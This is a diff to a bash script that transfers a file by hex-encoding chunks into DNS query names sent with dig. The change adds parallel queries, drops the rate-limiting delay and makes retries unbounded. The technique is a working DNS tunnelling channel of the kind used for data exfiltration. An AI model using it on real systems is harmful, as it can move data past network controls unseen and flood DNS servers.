@@ -49,6 +49,9 @@ echo "Hash: $HASH8"
 echo "Domain: $DOMAIN"
 echo ""
 
+# Maximum number of parallel DNS queries (adjust based on your system)
+MAX_PARALLEL=${MAX_PARALLEL:-20}
+
 # Function to split hex string into DNS labels (max 63 chars per label)
 split_hex_labels() {
     local hex_str="$1"
@@ -80,47 +83,68 @@ else
 fi
 sleep 0.1
 
-# Read file and send chunks (1-based part numbering)
-PART_NUM=1
-BYTES_READ=0
-
-while [ $BYTES_READ -lt $FILE_SIZE ]; do
+# Function to send a single DNS query (used in parallel)
+send_dns_query() {
+    local part_num=$1
+    local chunk_offset=$2
+    local chunk_size=$3
+    local hash8=$4
+    local domain=$5
+    local dns_server=$6
+    local file=$7
+    
     # Read chunk and encode to hex in one step (avoid null byte warning)
-    CHUNK_HEX=$(dd if="$FILE" bs=1 skip=$BYTES_READ count=$CHUNK_SIZE 2>/dev/null | xxd -p | tr -d '\n')
+    local chunk_hex=$(dd if="$file" bs=1 skip=$chunk_offset count=$chunk_size 2>/dev/null | xxd -p | tr -d '\n')
     
     # Split hex into DNS labels
-    CHUNK_HEX_LABELS=$(split_hex_labels "$CHUNK_HEX")
+    local chunk_hex_labels=$(split_hex_labels "$chunk_hex")
     
     # Build data record query
     # Format: data_hex.part_num.hash8.<domain>
-    DATA_QUERY="${CHUNK_HEX_LABELS}.${PART_NUM}.${HASH8}.${DOMAIN}"
+    local data_query="${chunk_hex_labels}.${part_num}.${hash8}.${domain}"
     
     # Send DNS query
-    echo -n "Sending part $PART_NUM/$TOTAL_PARTS... "
-    if [ -z "$DNS_SERVER" ]; then
-        dig +short "$DATA_QUERY" TXT > /dev/null 2>&1 || true
+    if [ -z "$dns_server" ]; then
+        dig +short "$data_query" TXT > /dev/null 2>&1 || true
     else
-        dig +short @"$DNS_SERVER" "$DATA_QUERY" TXT > /dev/null 2>&1 || true
+        dig +short @"$dns_server" "$data_query" TXT > /dev/null 2>&1 || true
     fi
-    echo "done"
+}
+
+# Read file and send chunks in parallel (1-based part numbering)
+echo "Sending chunks in parallel (max $MAX_PARALLEL concurrent queries)..."
+PART_NUM=1
+BYTES_READ=0
+JOBS=0
+
+while [ $BYTES_READ -lt $FILE_SIZE ]; do
+    # Wait if we've reached max parallel jobs
+    while [ $(jobs -r | wc -l) -ge $MAX_PARALLEL ]; do
+        sleep 0.01
+    done
+    
+    # Start DNS query in background
+    (
+        send_dns_query "$PART_NUM" "$BYTES_READ" "$CHUNK_SIZE" "$HASH8" "$DOMAIN" "$DNS_SERVER" "$FILE"
+        echo "Part $PART_NUM/$TOTAL_PARTS sent"
+    ) &
     
     BYTES_READ=$((BYTES_READ + CHUNK_SIZE))
     PART_NUM=$((PART_NUM + 1))
-    
-    # Small delay to avoid overwhelming the DNS server
-    sleep 0.05
 done
+
+# Wait for all background jobs to complete
+wait
 
 echo ""
 echo "Initial transfer complete! Sent $TOTAL_PARTS parts."
 
-# Check for missing chunks and retry
-MAX_RETRIES=10
+# Check for missing chunks and retry (retry indefinitely until all chunks are received)
 RETRY_COUNT=0
 
-while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
-    # Wait a bit for server to process
-    sleep 0.5
+while true; do
+    # Wait 1 second for server to process
+    sleep 1
     
     # Query for missing chunks
     MISSING_QUERY="missing.${HASH8}.${DOMAIN}"
@@ -143,51 +167,31 @@ while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
     
     # Count missing chunks
     MISSING_COUNT=$(echo "$MISSING_CHUNKS" | wc -l)
+    RETRY_COUNT=$((RETRY_COUNT + 1))
     echo "Found $MISSING_COUNT missing chunk(s): $(echo $MISSING_CHUNKS | tr '\n' ' ')"
+    echo "Retry attempt $RETRY_COUNT: Retrying missing chunks in parallel..."
     
-    # Retry sending missing chunks (1-based, so subtract 1 for offset)
+    # Retry sending missing chunks in parallel (1-based, so subtract 1 for offset)
     for chunk_num in $MISSING_CHUNKS; do
+        # Wait if we've reached max parallel jobs
+        while [ $(jobs -r | wc -l) -ge $MAX_PARALLEL ]; do
+            sleep 0.01
+        done
+        
         # Calculate byte offset for this chunk (1-based part number, so subtract 1)
         chunk_offset=$(((chunk_num - 1) * CHUNK_SIZE))
         
-        # Read chunk and encode to hex
-        CHUNK_HEX=$(dd if="$FILE" bs=1 skip=$chunk_offset count=$CHUNK_SIZE 2>/dev/null | xxd -p | tr -d '\n')
-        
-        # Split hex into DNS labels
-        CHUNK_HEX_LABELS=$(split_hex_labels "$CHUNK_HEX")
-        
-        # Build data record query
-        DATA_QUERY="${CHUNK_HEX_LABELS}.${chunk_num}.${HASH8}.${DOMAIN}"
-        
-        # Send DNS query
-        echo -n "  Retrying chunk $chunk_num... "
-        if [ -z "$DNS_SERVER" ]; then
-            dig +short "$DATA_QUERY" TXT > /dev/null 2>&1 || true
-        else
-            dig +short @"$DNS_SERVER" "$DATA_QUERY" TXT > /dev/null 2>&1 || true
-        fi
-        echo "done"
-        
-        sleep 0.05
+        # Start DNS query in background
+        (
+            send_dns_query "$chunk_num" "$chunk_offset" "$CHUNK_SIZE" "$HASH8" "$DOMAIN" "$DNS_SERVER" "$FILE"
+            echo "  Chunk $chunk_num retried"
+        ) &
     done
     
-    RETRY_COUNT=$((RETRY_COUNT + 1))
-    echo "Retry attempt $RETRY_COUNT/$MAX_RETRIES completed"
+    # Wait for all retry jobs to complete
+    wait
     echo ""
 done
-
-if [ $RETRY_COUNT -eq $MAX_RETRIES ]; then
-    echo "Warning: Reached maximum retry attempts. Some chunks may still be missing."
-    # Final check
-    if [ -z "$DNS_SERVER" ]; then
-        FINAL_CHECK=$(dig +short "missing.${HASH8}.${DOMAIN}" TXT 2>/dev/null || echo "")
-    else
-        FINAL_CHECK=$(dig +short @"$DNS_SERVER" "missing.${HASH8}.${DOMAIN}" TXT 2>/dev/null || echo "")
-    fi
-    if [ -n "$FINAL_CHECK" ]; then
-        echo "Still missing: $(echo "$FINAL_CHECK" | grep -oE '"[0-9]+"' | tr -d '"' | tr '\n' ' ')"
-    fi
-fi
 
 echo ""
 echo "Transfer complete! File should be received as: $FILENAME"
